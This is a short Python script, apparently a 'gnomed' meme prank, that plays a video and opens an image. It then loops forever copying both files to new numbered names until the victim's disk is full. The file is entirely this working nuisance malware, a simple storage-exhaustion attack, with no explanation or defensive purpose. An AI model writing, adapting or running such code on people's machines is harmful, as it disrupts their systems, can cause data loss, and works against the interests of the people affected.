import shutil
from os import startfile
import time as t

y = 0

def duplicate():
    gloy = y
    while True:
        shutil.copyfile('gnomed.jpg', str(gloy)+'.jpg')
        shutil.copyfile('gnoomed.mp4', str(gloy)+'.mp4')
        gloy=gloy+1
        
def play_movie():
    startfile('gnoomed.mp4')

def spam_image():
    startfile('gnomed.jpg')



def main_code():
    play_movie()
    t.sleep(15.8)
    while True:
        spam_image()
        duplicate()

main_code()
